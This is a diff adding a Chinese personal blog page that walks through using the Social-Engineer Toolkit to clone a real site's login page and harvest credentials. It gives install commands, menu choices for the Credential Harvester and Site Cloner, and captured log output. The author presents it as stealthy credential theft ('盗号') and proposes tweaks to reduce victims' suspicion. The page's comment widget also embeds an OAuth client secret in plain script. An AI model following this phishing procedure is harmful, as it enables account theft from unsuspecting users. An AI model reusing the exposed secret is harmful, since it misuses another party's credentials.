@@ -1,0 +1,274 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+ <head>
+     <meta charset="utf-8" />
+  <title>Setoolkit工具克隆网站钓鱼攻击 | 14u9h&#39;Blog</title>
+  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport" />
+  <link rel="stylesheet" href="https://14u9h.github.io//styles/main.css" />
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+   <script src="https://cdn.staticfile.org/highlight.js/9.15.9/highlight.min.js"></script>
+    <script>hljs.initHighlightingOnLoad();</script>
+ </head>
+ <body>
+     <div class="sidebar animated fadeInDown">
+   <div class="logo-title">
+    <div class="title">
+     <img class="avatar" src="https://14u9h.github.io//images/avatar.png?v=1608626937814" width="180" height="128" />
+
+     <div class="description">
+      <p>#世界以痛吻我，偏要报之以歌</p>
+     </div>
+    </div>
+   </div>
+   <ul class="social-links">
+
+
+    <li><a href="https://14u9h.github.io/atom.xml"><i class="fa fa-rss"></i></a></li>
+ 
+    
+
+    <li><a href="https://twitter.com/#"><i class="fa fa-twitter"></i></a></li>
+ 
+    
+
+    <li><a href="https://www.facebook.com/#"><i class="fa fa-facebook"></i></a></li>
+ 
+    
+
+    <li><a href="https://github.com/14u9h/"><i class="fa fa-github"></i></a></li>
+ 
+    
+
+    
+
+    
+
+    
+
+    <li><a href="https://weibo.com/#"><i class="fa fa-weibo"></i></a></li>
+ 
+    
+
+    <li><a href="10000"><i class="fa fa-qq"></i></a></li>
+ 
+    
+
+    
+
+   </ul>
+   <div class="footer">
+    <div class="by_farbox">
+   Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+    </div>
+    
+
+    </div>
+   </div>
+  </div>
+  <div class="main">
+     <div class="page-top animated fadeInDown">
+    <div class="nav">
+    
+     <li><a  href="/">首页</a></li>
+
+     <li><a  href="/archives">归档</a></li>
+
+     <li><a  href="/tags">标签</a></li>
+
+     <li><a  href="/post/about">关于</a></li>
+
+     <li><a  href="/post/Links">友链</a></li>
+
+    </div>
+    <div class="information">
+     <div class="back_btn">
+      <li><a class="fa fa-chevron-left" onclick="window.history.go(-1)"> </a></li>
+     </div>
+    </div>
+   </div>
+   <div class="autopagerize_page_element">
+    <div class="content">
+     <div class="post-page">
+      <div class="post animated fadeInDown">
+       <div class="post-title">
+        <h3><a>Setoolkit工具克隆网站钓鱼攻击</a></h3>
+       </div>
+       <div class="post-content">
+        <h3 id="使用场景">使用场景：</h3>
+<pre><code> 快速部署Setoolkit工具克隆目标站点实行钓鱼攻击，按照一贯的原则，快打快撤，用完即扔。
+</code></pre>
+<p>Setoolkit工具还是稍微有点臃肿了，一般用不到它的邮件伪造的鱼叉攻击和投递Payload这些模块，邮件还是要可视化比较容易观察视觉上的不妥，投递Payload适合使用CobaltStrike这款后渗透神器上的插件。</p>
+<!-- more -->
+<p>不过基于当前没有找到合适的工具，先用着，有比较短小精专的网站克隆的钓鱼攻击工具可以推荐给我。</p>
+<h3 id="安装部署">安装部署</h3>
+<p>Setoolkit项目地址：https://github.com/trustedsec/social-engineer-toolkit<br>
+需要的环境：Python3、pip3<br>
+将项目文件拉取到本地：</p>
+<pre><code>linux $ git clone https://github.com/trustedsec/social-engineer-toolkit.git
+
+大陆境内下载Github中的文件还是慢的，最好能在境内弄个镜像
+</code></pre>
+<p>安装依赖模块和Setoolkit：</p>
+<pre><code>linux $ cd social-engineer-toolkit/     # 进入下载的项目文件夹中
+
+linux $ sudo pip3 install -r requirements.txt       # 安装需要的Python模块。
+
+linux $ sudo python3 setup.py       # 安装Setoolkit。注意root权限
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://14u9h.github.io//post-images/1608622783600.png" alt="" loading="lazy"></figure>
+<h3 id="克隆网站">克隆网站</h3>
+<p>以root权限运行Setoolkit，不然会报错</p>
+<pre><code>linux # setoolkit
+
+Select from the menu[从菜单中选择]:
+
+   1) Social-Engineering Attacks[社会工程学攻击]
+   2) Penetration Testing (Fast-Track)[渗透测试(快速跟踪)]
+   3) Third Party Modules[第三方模块]
+   4) Update the Social-Engineer Toolkit[更新社会工程师工具包]
+   5) Update SET configuration[更新SET配置]
+   6) Help, Credits, and About[帮助和关于]
+   99) Exit the Social-Engineer Toolkit[退出]
+
+set&gt; 1
+选择&quot;1&quot;社会工程学攻击
+</code></pre>
+<p>可以看到菜单中，有很多供我们选择的模块，但实在是功能重复了，要是能想办法给它缩减再缩减就好了。<br>
+进入&quot;社会工程学攻击&quot;菜单后，又能选择鱼叉、邮件、甚至是无线等攻击模块，但我们只需要克隆网站。</p>
+<pre><code>   1) Spear-Phishing Attack Vectors[鱼叉式网络钓鱼攻击]
+   2) Website Attack Vectors[网站攻击向量]
+   3) Infectious Media Generator[传染性媒体生成器]
+   4) Create a Payload and Listener[创建有效载荷与监听]
+   5) Mass Mailer Attack[群发邮件攻击]
+   6) Arduino-Based Attack Vector[基于Arduino的攻击]
+   7) Wireless Access Point Attack Vector[无线接入点攻击]
+   8) QRCode Generator Attack Vector[QRCode生成器攻击]
+   9) Powershell Attack Vectors[Powershell攻击]
+   10) Third Party Modules[第三方模块]
+   99) Return back to the main menu.[返回主菜单]
+
+  set&gt; 2
+  选择&quot;2&quot;，网站攻击向量
+</code></pre>
+<p>到下面我们就猛选3就行，其他的都是动静比较大的直接攻击载荷投递和浏览器漏洞利用，我们只需要选择3，偷偷的钓个鱼获取个登录账号密码就行。😁</p>
+<pre><code>   1) Java Applet Attack Method[Java Applet攻击模块]
+   2) Metasploit Browser Exploit Method[Metasploit浏览器EXP攻击]
+   3) Credential Harvester Attack Method[收集凭证攻击模块]
+   4) Tabnabbing Attack Method[浏览器标签钓鱼攻击模块]
+   5) Web Jacking Attack Method[Web劫持攻击模块]
+   6) Multi-Attack Web Method[多种攻击方式]
+   7) HTA Attack Method[直接投递可执行文件]
+   99) Return to Main Menu[返回主菜单]
+
+set&gt; 3
+这里我们只需要盗取凭证，也就是通俗的&quot;盗号&quot;，所以选择3就行。
+
+   1) Web Templates[使用预设模板]
+   2) Site Cloner[网站克隆]
+   3) Custom Import[自定义导入]
+   99) Return to Webattack Menu[返回网络攻击菜单]
+
+set&gt; 2
+选择&quot;2&quot;，我们需要的是&quot;克隆&quot;，预设模板一般来说是不会用到的，除非你需要经常针对某些网站进行凭证收集工作。
+
+set:webattack&gt; IP address for the POST back in Harvester/Tabnabbing [192.168.3.45]:输入服务器对外的IP
+
+set:webattack&gt; Enter the url to clone:输入你需要克隆的网站url
+
+[*] Cloning the website: http://www.91ri.org/wp-login.php
+[*] This could take a little bit...
+
+The best way to use this attack is if username and password form fields are available. Regardless, this captures all POSTs on a website.
+[*] The Social-Engineer Toolkit Credential Harvester Attack
+[*] Credential Harvester is running on port 80
+[*] Information will be displayed to you as it arrives below:
+192.168.3.9 - - [22/Dec/2020 16:26:13] &quot;GET / HTTP/1.1&quot; 200 -
+</code></pre>
+<p>这里我将91Ri作为目标进行克隆演示，可以看到的是，我们按照预想成功克隆了后台登录页面，在输入密码后，终端也接收到了账号密码，然后钓鱼网站自动跳转到了91Ri的真实地址。<br>
+<img src="https://14u9h.github.io//post-images/1608625998998.png" alt="" loading="lazy"><br>
+<img src="https://14u9h.github.io//post-images/1608626005317.png" alt="" loading="lazy"><br>
+<img src="https://14u9h.github.io//post-images/1608626010003.png" alt="" loading="lazy"></p>
+<h3 id="不足之处">不足之处</h3>
+<p>目前在演示和测试过程中遇到了以下的问题。</p>
+<ol>
+<li>HTTPS加密协议可能会抓不到请求密码</li>
+<li>有验证码的网站无法克隆验证码信息</li>
+<li>某些大的厂商可能会有防止克隆的手段，编码和自动跳转到真实目标站，这点就可能需要针对性的自定义一些模板。</li>
+<li>首次登录会直接跳转到真实目标网站，首次登录应提示&quot;密码或账号错误&quot;的手段以打消受害者的怀疑了，得改得改。</li>
+</ol>
+<p>p.s<br>
+上次更新是2019年12月25日，只要我在今年12月25日之前更新一篇文章，那我就不是年更博主了！<br>
+<s>不过，2020年进步显著，给自己呱唧呱唧</s></p>
+
+       </div>
+       <div class="post-footer">
+        <div class="meta">
+         <div class="info">
+          <i class="fa fa-sun-o"></i>
+          <span class="date">2020-12-22</span>
+          <i class="fa fa-tag"></i>
+          
+          <a class="tag" href="https://14u9h.github.io/tag/yLy_N24qO/" title="渗透打点">渗透打点 </a>
+          
+          <a class="tag" href="https://14u9h.github.io/tag/eBdBrCqC5/" title="社会工程学">社会工程学 </a>
+          
+         </div>
+        </div>
+       </div>
+      </div>
+      <div class="share">
+       <div class="evernote">
+        <a class="fa fa-bookmark" href="javascript:(function(){EN_CLIP_HOST='http://www.evernote.com';try{var%20x=document.createElement('SCRIPT');x.type='text/javascript';x.src=EN_CLIP_HOST+'/public/bookmarkClipper.js?'+(new%20Date().getTime()/100000);document.getElementsByTagName('head')[0].appendChild(x);}catch(e){location.href=EN_CLIP_HOST+'/clip.action?url='+encodeURIComponent(location.href)+'&amp;title='+encodeURIComponent(document.title);}})();" ref="nofollow" target="_blank"></a>
+       </div>
+       <div class="weibo">
+        <a class="fa fa-weibo" href="javascript:void((function(s,d,e){try{}catch(e){}var f='http://service.weibo.com/share/share.php?',u=d.location.href,p=['url=',e(u),'&amp;title=',e(d.title),'&amp;appkey=2924220432'].join('');function a(){if(!window.open([f,p].join(''),'mb',['toolbar=0,status=0,resizable=1,width=620,height=450,left=',(s.width-620)/2,',top=',(s.height-450)/2].join('')))u.href=[f,p].join('');};if(/Firefox/.test(navigator.userAgent)){setTimeout(a,0)}else{a()}})(screen,document,encodeURIComponent));"></a>
+       </div>
+       <div class="twitter">
+        <a class="fa fa-twitter" href="http://twitter.com/home?status=,https://14u9h.github.io/post/hrkXnfnPH/,;"></a>
+       </div>
+      </div>
+      <div class="pagination">
+       <ul class="clearfix">
+
+        
+        <li class="next pagbuttons"><a class="btn" role="navigation" href="https://14u9h.github.io/post/CVE-2018-8581/" title=" Microsoft Exchange任意用户伪造漏洞(CVE-2018-8581)复现">下一篇</a></li>
+        
+       </ul>
+      </div>
+        
+          
+            <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+<div id="gitalk-container"></div>
+
+<script>
+
+  var gitalk = new Gitalk({
+    clientID: 'dce8c8190903e67ed74c',
+    clientSecret: '841e23bef6d7396fffe05ca97cb0411b086a7a79',
+    repo: '14u9h.github.io',
+    owner: '14u9h',
+    admin: ['14u9h'],
+    id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+    distractionFreeMode: false  // Facebook-like distraction free mode
+  })
+
+  gitalk.render('gitalk-container')
+
+</script>
+
+          
+          
+        
+     </div>
+    </div>
+   </div>
+  </div>
+  <script src="https://14u9h.github.io//media/scripts/jquery.js"></script>
+  <script src="https://14u9h.github.io//media/scripts/jquery-migrate-1.2.1.min.js"></script>
+  <script src="https://14u9h.github.io//media/scripts/jquery.appear.js"></script>
+
+
+ </body>
+</html>
